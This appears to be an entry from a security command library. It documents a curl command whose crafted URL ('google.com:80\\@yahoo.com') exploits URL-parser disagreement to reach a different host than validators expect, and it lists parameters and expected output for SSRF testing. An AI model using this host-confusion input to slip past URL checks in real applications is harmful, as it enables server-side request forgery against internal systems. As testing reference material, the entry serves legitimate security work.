---
id: cmd-curl-ssrf
data: 'curl -sD - -o /dev/null "http://google.com:80\\@yahoo.com/"'
tags:
  - ssrf
  - curl
  - url-parsing
type: command
output: "HTTP/1.1 200 OK\r\nDate: ...\r\nServer: ATS\r\n..."
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.382Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-host-confusion

## Command

```bash
curl -sD - -o /dev/null "http://google.com:80\\@yahoo.com/"
```

## Description

This command demonstrates SSRF by exploiting curl's URL parsing to connect to an unintended host (yahoo.com) while the URL validates as google.com in other parsers. Use it to test for host confusion vulnerabilities in applications using curl.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| `D -` | Dump headers to stdout | Yes |
| `-o /dev/null` | Discard response body to /dev/null | Yes |
| `URL` | Crafted URL: http://google.com:80\\@yahoo.com/ - backslash escapes @ for host confusion | Yes |

## Examples

### Basic Usage

```bash
curl -sD - -o /dev/null "http://google.com:80\\@yahoo.com/"
```

### Advanced Usage

To save headers to a file:

```bash
curl -sD headers.txt -o /dev/null "http://google.com:80\\@yahoo.com/"
```

## Expected Output

HTTP headers from the unintended host (yahoo.com), such as:

```
HTTP/1.1 200 OK
Date: Mon, 01 Oct 2023 12:00:00 GMT
Server: ATS
Content-Type: text/html
...
```

This confirms the request reached yahoo.com instead of google.com.

## Related

- [[Related Procedure|procedures/Exploit-Curl-Host-Confusion-for-SSRF]]
- [[Related Tool|tools/curl]]
